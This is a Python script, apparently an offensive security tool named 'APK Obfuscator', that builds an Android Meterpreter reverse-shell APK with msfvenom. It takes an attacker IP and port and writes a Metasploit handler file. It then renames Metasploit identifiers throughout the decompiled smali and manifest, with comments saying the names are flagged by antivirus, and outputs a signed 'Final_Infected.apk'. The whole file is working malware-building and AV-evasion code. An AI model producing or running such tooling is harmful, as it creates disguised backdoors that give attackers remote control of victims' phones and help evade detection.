import subprocess
import os
import argparse

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

pwd = os.getcwd()


def get_arguments():
    parser = argparse.ArgumentParser(description=f'{RED}APK Obfuscator v1.0')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"

    required_arguments = parser.add_argument_group(
        f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument(
        "--lhost", dest="lhost", help="Attacker's IP Address", required=True)
    required_arguments.add_argument(
        "--lport", dest="lport", help="Attacker's Port", required=True)
    required_arguments.add_argument(
        "--apk-name", dest="apkName", help="APK Name (Anything You Want To Name)", required=True)

    return parser.parse_args()


def check_dependencies_and_updates():
    print(f"{YELLOW}\n[*] Checking for Dependencies \n{WHITE}================================\n\n[:] NOTE : {GREEN}Jarsigner{WHITE} or {GREEN}APKsigner{WHITE} is used to Sign APK, One of them must be installed on your System")
    print(f"{YELLOW}\n[*] Checking : APKTool")
    apktool = os.system("which apktool > /dev/null")
    if apktool == 0:
        print(f"{GREEN}[+] APKTool - OK")
    else:
        print(f"{RED}[!] APKTool - 404 NOT FOUND !")
        apktool_install = input(
            f"{BLUE}\n[?] What to Install It Now ? (y/n) : ")
        if apktool_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install apktool")

    print(f"{YELLOW}\n[*] Checking : Jarsigner")
    jarsigner = os.system("which jarsigner > /dev/null")
    if jarsigner == 0:
        print(f"{GREEN}[+] Jarsigner - OK")
    else:
        print(f"{RED}[!] Jarsigner - 404 NOT FOUND !")
        jarsigner_install = input(
            f"{BLUE}\n[?] What to Install It Now ? (y/n) : {WHITE}")
        if jarsigner_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install openjdk-11-jdk")
            print(f"{WHITE}\n[:] Please Select Latest Java Version ")
            os.system("update-alternatives --config java")

    print(f"{YELLOW}\n[*] Checking : ZipAlign")
    zipalign = os.system("which zipalign > /dev/null")
    if zipalign == 0:
        print(f"{GREEN}[+] ZipAlign - OK")
    else:
        print(f"{RED}[!] ZipAlign- 404 NOT FOUND !")
        jarsigner_install = input(
            f"{BLUE}\n[?] What to Install It Now ? (y/n) : {WHITE}")
        if jarsigner_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install zipalign")


def ask_for_payload_type():
    print(WHITE, """ 
    ====================================    
    [*] Available Types of Payload
    ====================================
    \tStaged Payloads
    (1) android/meterpreter/reverse_tcp
    (2) android/meterpreter/reverse_http    
    (3) android/meterpreter/reverse_https
    \tStageless Payloads
    (4) android/meterpreter_reverse_tcp    
    (5) android/meterpreter_reverse_http
    (6) android/meterpreter_reverse_https
    """)
    choice = int(
        input(f"{BLUE}[?] Which Type of Payload, You Want to Create (1/2/3): "))
    return choice


def generate_meterpreter_payload(lhost, lport):
    payload_type = ask_for_payload_type()
    if payload_type == 1:
        type_of_payload = "android/meterpreter/reverse_tcp"
    elif payload_type == 2:
        type_of_payload = "android/meterpreter/reverse_http"
    elif payload_type == 3:
        type_of_payload = "android/meterpreter/reverse_https"
    elif payload_type == 4:
        type_of_payload = "android/meterpreter_reverse_tcp"
    elif payload_type == 5:
        type_of_payload = "android/meterpreter_reverse_http"
    elif payload_type == 6:
        type_of_payload = "android/meterpreter_reverse_https"

    print(f"{YELLOW}\n[*] Creating Android Payload Using msfvenom")
    os.system(
        f"msfvenom -p {type_of_payload} LHOST={lhost} LPORT={lport} > android_payload.apk")
    if os.path.exists("android_payload.apk"):
        print(f"{GREEN}[+] Payload Created Successfully !")

    choice_handler = input(
        f"\n{BLUE}[?] Want to Create msfconsole handler.rc file (y/n): ")
    if choice_handler.lower() == 'y':
        print(f"{YELLOW}\n[*] Creating handler.rc")
        if os.path.exists("handler.rc"):
            os.system("rm handler.rc")
        handler = open("handler.rc", "w")
        handler.write("use exploit/multi/handler\n")
        handler.write(f"set PAYLOAD {type_of_payload}\n")
        handler.write(f"set LHOST {lhost}\n")
        handler.write(f"set LPORT {lport}\n")
        handler.write("exploit -j")
        handler.close()
        print(f"{GREEN}[+] Created Successfully : {pwd}/handler.rc")


def decompile_evil_apk():
    print(
        f"{YELLOW}\n[*] Decompiling Android Payload\n=============================================")
    decompile_evil_apk = os.system(
        f"apktool d {pwd}/android_payload.apk -o {pwd}/android_payload")
    if decompile_evil_apk == 0:
        print(f"{GREEN}[+] Decompiled Successfully !")
    else:
        print(f"{RED}[!] Failed to Decompile Evil APK")
        exit(1)


def compile_infected_apk():
    print(
        f"{YELLOW}\n[*] Compiling Infected APK\n=================================")
    os.system(f"apktool b {pwd}/android_payload -o {pwd}/injected.apk")
    print(f"{GREEN}[+] Compiled Successfully!")


def sign_apk():
    try:
        os.system("rm -rf ~/.android")
        os.system("mkdir ~/.android")
    except Exception:
        pass

    print(f"{YELLOW}\n[*] Generating Key to Sign APK ")
    keytool = os.system(
        "keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000")
    if keytool == 0:
        print(f"{GREEN}[+] Key Generated Successfully!")

    print(f"{YELLOW}\n[*] Trying to Sign APK Using Jarsigner")
    os.system(
        f"jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA {pwd}/injected.apk androiddebugkey")
    print(
        f"{GREEN}[+] Signed the .apk file using {WHITE} ~/.android/debug.keystore")


def zipalign_apk():
    print(
        f"{YELLOW}\n[*] ZipAligning Signed APK\n{WHITE}=================================={YELLOW}")
    zipalign_apk = os.system(
        f"zipalign -v 4 {pwd}/injected.apk {pwd}/signed.apk")
    if zipalign_apk == 0:
        print(f"{GREEN}[+] ZipAligned APK Successfully!")


def housekeeping():
    os.system(f"mv {pwd}/signed.apk {pwd}/Final_Infected.apk")
    os.system(
        f"rm -rf {pwd}/android_payload {pwd}/normal_apk {pwd}/android_payload.apk {pwd}/injected.apk")
    print(f"{GREEN}[+] Output : {WHITE} {pwd}/Final_Infected.apk")
    print("\n\n")
    print(f"{GREEN}\n\n !!!! HAPPY HUNTING !!!!")


def change_file_and_folder_name_of_payload(VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7, VAR8, apkName):
    print(
        f"{YELLOW}\n[*] Changing default folder and filenames being flagged by AV")
    # Changing the default folder and filenames
    os.system(
        f"mv {pwd}/android_payload/smali/com/metasploit {pwd}/android_payload/smali/com/{VAR1}")
    os.system(
        f"mv {pwd}/android_payload/smali/com/{VAR1}/stage {pwd}/android_payload/smali/com/{VAR1}/{VAR2}")
    os.system(
        f"mv {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/Payload.smali {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")

    # Updating paths in .smali files
    os.system(
        f"sed -i \"s#/metasploit/stage#/{VAR1}/{VAR2}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
    os.system(
        f"sed -i \"s#Payload#{VAR3}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")

    # Flagged by AV, changed to something not as obvious
    os.system(
        f"sed -i \"s#com.metasploit.meterpreter.AndroidMeterpreter#com.{VAR4}.{VAR5}.{VAR6}#\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
    os.system(
        f"sed -i \"s#payload#{VAR7}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
    os.system(
        f"sed -i \"s#com.metasploit.stage#com.{VAR1}.{VAR2}#\" {pwd}/android_payload/AndroidManifest.xml")
    os.system(
        f"sed -i \"s#metasploit#{VAR8}#\" {pwd}/android_payload/AndroidManifest.xml")
    os.system(
        f"sed -i \"s#MainActivity#{apkName}#\" {pwd}/android_payload/res/values/strings.xml")
    print(f"{GREEN}[+] Changed Successfully!")


if __name__ == '__main__':

    arguments = get_arguments()

    print(
        f"{YELLOW}\n[*] Generating Random Variables which will be used in Obfuscation")

    VAR1 = subprocess.check_output(
        "cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)  # smali dir renaming
    VAR1 = str(VAR1.strip()).split('\'')[1]
    VAR2 = subprocess.check_output(
        "cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)  # smali dir renaming
    VAR2 = str(VAR2.strip()).split('\'')[1]
    VAR3 = subprocess.check_output(
        "cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)  # Payload.smali renaming
    VAR3 = str(VAR3.strip()).split('\'')[1]
    VAR4 = subprocess.check_output(
        "cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)  # Pakage name renaming 1
    VAR4 = str(VAR4.strip()).split('\'')[1]
    VAR5 = subprocess.check_output(
        "cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)  # Pakage name renaming 2
    VAR5 = str(VAR5.strip()).split('\'')[1]
    VAR6 = subprocess.check_output(
        "cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)  # Pakage name renaming 3
    VAR6 = str(VAR6.strip()).split('\'')[1]
    # New name for word 'payload'
    VAR7 = subprocess.check_output(
        "cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
    VAR7 = str(VAR7.strip()).split('\'')[1]
    # New name for word 'metasploit'
    VAR8 = subprocess.check_output(
        "cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
    VAR8 = str(VAR8.strip()).split('\'')[1]

    apkName = arguments.apkName
    print(f"{GREEN}[+] Generated Successfully!")

    check_dependencies_and_updates()

    generate_meterpreter_payload(arguments.lhost, arguments.lport)

    decompile_evil_apk()

    change_file_and_folder_name_of_payload(
        VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7, VAR8, apkName)

    compile_infected_apk()
    sign_apk()
    zipalign_apk()
    housekeeping()
